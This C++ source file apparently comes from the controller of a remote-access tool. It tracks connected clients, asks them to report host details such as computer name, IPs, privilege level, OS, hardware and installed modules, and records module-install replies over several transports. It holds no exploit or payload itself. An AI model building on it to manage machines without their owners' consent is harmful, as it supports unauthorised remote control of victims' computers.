#include "stdafx.h"
#include "CommManager.h"
#include "ClientmodManager.h"
#include "Common.h"
#include "ClientInfoManager.h"
#include <algorithm>

ClientInfoManager::ClientInfoManager()
	: m_fnCallback(NULL)
	, m_lpParameter(NULL)
	, m_fnModuleCallback(NULL)
{

}

ClientInfoManager::~ClientInfoManager()
{

}

BOOL ClientInfoManager::Init()
{
	CommManager::GetInstanceRef().RegisterMsgHandler(MSGID_OUTPUT_ERROR, MsgHandler_OutputError, this);
	CommManager::GetInstanceRef().RegisterMsgHandler(MSGID_REQUEST_REPORT_INFO, MsgHandler_ClientInfo, this);
	return TRUE;
}

BOOL ClientInfoManager::MsgHandler_OutputError( MSGID msgid, const CommData& commData, LPVOID lpParameter )
{
	DECLARE_STR_PARAM(error);
	errorLog(_T("[CLIENT ERROR][%s] %s"),error.c_str(),commData.GetClientID());
	return TRUE;
}
BOOL ClientInfoManager::MsgHandler_ClientInfo( MSGID msgid, const CommData& commData, LPVOID lpParameter )
{
	CLIENT_BASE_INFO info;
	ClientInfoManager *lpMgr = (ClientInfoManager*)lpParameter;

	lpMgr->m_infoMapSection.Enter();
	{
		lpMgr->ParseData(commData,info);

		if(info.bValid)
		{
			lpMgr->m_clientBaseInfoMap[commData.GetClientID()] = info;
		}
	}
	lpMgr->m_infoMapSection.Leave();

	return TRUE;
}
void ClientInfoManager::Deinit()
{
	m_checkInfoTask.Stop();
}

BOOL ClientInfoManager::StartWorking()
{
	m_checkInfoTask.Stop();
	if (! m_checkInfoTask.Init(CheckInfoTask, this, _T("clientinfo check task"), 1, 1))
	{
		errorLog(_T("init checkinfo task failed"));
		return FALSE;
	}

	if (! m_checkInfoTask.Start())
	{
		errorLog(_T("start checkinfo task failed"));
		return FALSE;
	}

	return TRUE;
}

BOOL ClientInfoManager::GetClientBaseInfo( LPCTSTR clientid, CLIENT_BASE_INFO& baseInfo )
{
	BOOL bFound = FALSE;
	m_infoMapSection.Enter();
	{
		ClientBaseInfoMap::const_iterator finditer = m_clientBaseInfoMap.find(clientid);
		if (finditer != m_clientBaseInfoMap.end())
		{
			const CLIENT_BASE_INFO& info = finditer->second;

			baseInfo = info;

			bFound = TRUE;
		}
	}
	m_infoMapSection.Leave();

	return bFound;
}

void ClientInfoManager::HandleInstalMsg( tstring clientid,CLIENT_BASE_INFO& info )
{
	MsgSerialIDMap::iterator msgidIter = info.installModMsgIDMap.begin();
	while (msgidIter != info.installModMsgIDMap.end())
	{
		//尝试从通信管理器获取回应消息
		CommData retData;
		if (CommManager::GetInstanceRef().GetReplyMessage(clientid.c_str(), msgidIter->second, retData))
		{
			tstring reply;
			if (retData.GetStrData(_T("reply"), reply))
			{
				if (reply == _T("install success"))
				{
					info.mods += msgidIter->first.c_str();
					info.mods += ',';
					std::transform(info.mods.begin(),info.mods.end(),info.mods.begin(),tolower);
				}
			}

			debugLog(_T("install reply is %s"), reply.c_str());

			msgidIter = info.installModMsgIDMap.erase(msgidIter);
		}
		else
		{
			debugLog(_T("no reply for [%s][%I64u] yet"), clientid.c_str(), msgidIter->second);
			msgidIter++;
		}
	}
}

DWORD WINAPI ClientInfoManager::CheckInfoTask( LPVOID lpParameter )
{
	ClientInfoManager* pMgr = (ClientInfoManager*) lpParameter;
	pMgr->CheckInfoProc();
	return 0;
}

void ClientInfoManager::CheckInfoProc()
{
	TStringVector clientidList;
	CommManager::GetInstanceRef().ListAvailableClient(clientidList);

	TStringSet clientidSet;
	TStringVector2TStringSet(clientidList, clientidSet);

	m_infoMapSection.Enter();
	{
		//从m_clientBaseInfoMap中删除已经不可用的clientinfo
		ClientBaseInfoMap::iterator infoIter = m_clientBaseInfoMap.begin();
		while (infoIter != m_clientBaseInfoMap.end())
		{
			if (clientidSet.find(infoIter->first) == clientidSet.end())
			{
				CLIENT_INFO clientInfo = {0};
				TransferInfo(infoIter->first.c_str(), &infoIter->second, clientInfo);
				if (NULL != m_fnCallback && (infoIter->second.bAdd == FALSE))
					m_fnCallback(WM_DEL_CLIENT, (LPVOID)&clientInfo, m_lpParameter);
				infoIter = m_clientBaseInfoMap.erase(infoIter);
			}
			else
			{
				infoIter++;
			}
		}

		//遍历clientidList，更新m_clientBaseInfoMap
		TStringVector::iterator clientidIter = clientidList.begin();
		for (; clientidIter != clientidList.end(); clientidIter++)
		{
			const tstring& clientid = *clientidIter;

			infoIter = m_clientBaseInfoMap.find(clientid.c_str());

			//如果m_clientBaseInfoMap中没有该客户端的信息，则请求客户端上报
			if (infoIter == m_clientBaseInfoMap.end())
			{
				CLIENT_BASE_INFO info;
				info.bValid = FALSE;
				info.bAdd = TRUE;
				RequestReportInfo(clientid.c_str());
				m_clientBaseInfoMap[clientid] = info;
			}
			else
			{
				if (infoIter->second.installModMsgIDMap.size() > 0)
				{
					HandleInstalMsg(clientid,infoIter->second);
				}

				if (infoIter->second.bValid && infoIter->second.bAdd)
				{
					CLIENT_INFO info;
					TransferInfo(clientid.c_str(),&m_clientBaseInfoMap[clientid.c_str()],info);
					if (NULL != m_fnCallback) m_fnCallback(WM_ADD_CLIENT, (LPVOID)&info, m_lpParameter);
					infoIter->second.bAdd = FALSE;
				}
			}

		}
	}
	m_infoMapSection.Leave();
}

MSGSERIALID ClientInfoManager::RequestReportInfo( LPCTSTR clientid ) const
{
	CommData data;
	data.SetMsgID(MSGID_REQUEST_REPORT_INFO);

	return CommManager::GetInstanceRef().AddToSendMessage(clientid, data);
}

BOOL ClientInfoManager::ParseData( const CommData& commData, CLIENT_BASE_INFO& baseInfo ) const
{
	DECLARE_STR_PARAM(cn);
	DECLARE_STR_PARAM(ip);
	DECLARE_STR_PARAM(groups);
	DECLARE_STR_PARAM(vercode);
	DECLARE_STR_PARAM(priv);
	DECLARE_UINT64_PARAM(lang);
	DECLARE_UINT64_PARAM(mem);
	DECLARE_UINT64_PARAM(instime);
	DECLARE_UINT64_PARAM(os);
	DECLARE_UINT64_PARAM(x64);
	DECLARE_UINT64_PARAM(proto);
	DECLARE_UINT64_PARAM(cpufrep);
	DECLARE_UINT64_PARAM(cpunum);

	tstring mods;
	commData.GetStrData(_T("mods"), mods);

	baseInfo.computerName = cn;
	splitByChar(ip.c_str(), baseInfo.localIPList, ',');
	baseInfo.installTime = instime;
	baseInfo.windowsVersion = (WIN_VER_DETAIL) os;
	baseInfo.bX64 = (BOOL)x64;
	baseInfo.mods = mods;
	baseInfo.commtype = (COMM_NAME)proto;
	baseInfo.cpufrep = cpufrep;
	baseInfo.cpunum = cpunum;
	baseInfo.memsize = mem;

	baseInfo.groups = groups;
	baseInfo.priv = priv;
	baseInfo.vercode = vercode;
	baseInfo.lang = TransferLanguage(lang);

	_time64(&baseInfo.reportTime);
	SOCKADDR_IN addr;
	if (CommManager::GetInstanceRef().GetLastConnectionAddr(commData.GetClientID(), addr))
	{
		baseInfo.connectIP = addr.sin_addr.S_un.S_addr;
	}
	else
	{
		baseInfo.connectIP = 0;
	}

	baseInfo.bValid = TRUE;

	return TRUE;
}

void ClientInfoManager::SetCallbacks( FnNotifyProc fnCallback, LPVOID lpParameter )
{
	m_fnCallback = fnCallback;
	m_lpParameter = lpParameter;
}

void ClientInfoManager::TransferInfo( LPCTSTR clientid, const CLIENT_BASE_INFO* pBaseInfo, CLIENT_INFO& info ) const
{
	ZeroMemory(&info, sizeof(CLIENT_INFO));
	_tcscpy_s(info.clientid, clientid);
	//ZeroMemory(&info.installTime, sizeof(info.installTime));
	if (NULL != pBaseInfo)
	{
		info.bX64 = pBaseInfo->bX64;
		_tcscpy_s(info.computerName, pBaseInfo->computerName.c_str());
		info.connectIP = pBaseInfo->connectIP;
		info.windowsVersion = pBaseInfo->windowsVersion;
		_tcscpy_s(info.mods, pBaseInfo->mods.c_str());
		_tcscpy_s(info.groups,pBaseInfo->groups.c_str());
		_tcscpy_s(info.priv,pBaseInfo->priv.c_str());
		_tcscpy_s(info.lang,pBaseInfo->lang.c_str());
		_tcscpy_s(info.vercode,pBaseInfo->vercode.c_str());
		info.cpufrep = pBaseInfo->cpufrep;
		info.memsize = pBaseInfo->memsize;
		info.cpunum = pBaseInfo->cpunum;

		switch (pBaseInfo->commtype)
		{
		case COMMNAME_HTTP:
			_tcscpy_s(info.proto,_T("HTTP"));
			break;
		case COMMNAME_HTTPS:
			_tcscpy_s(info.proto,_T("HTTPS"));
			break;
		case COMMNAME_TCP:
			_tcscpy_s(info.proto,_T("TCP"));
			break;
		case COMMNAME_TCPS:
			_tcscpy_s(info.proto,_T("TCPS"));
			break;
		case COMMNAME_UDP:
			_tcscpy_s(info.proto,_T("UDP"));
			break;
		case COMMNAME_UDPS:
			_tcscpy_s(info.proto,_T("UDPS"));
			break;
		default:
			break;
		}

		FILETIME ftInstallTime = {0};
		if (Time2Filetime(pBaseInfo->installTime, &ftInstallTime))
		{
			FILETIME ftLocalInstallTime = {0};
			if (FileTimeToLocalFileTime(&ftInstallTime, &ftLocalInstallTime))
			{
				FileTimeToSystemTime(&ftLocalInstallTime, &info.installTime);
			}
		}

		info.localIPCount = min(MAX_LOCALIP_COUNT, pBaseInfo->localIPList.size());
		for (USHORT i = 0; i < info.localIPCount; i++)
		{
			info.localIPList[i] = ::htonl(inet_addr(t2a(pBaseInfo->localIPList[i].c_str())));
		}
	}
	else
	{
		info.bX64 = FALSE;
		info.connectIP = 0;
		info.windowsVersion = WINDOWS_VERSION_NONE;
		info.localIPCount = 0;
	}
}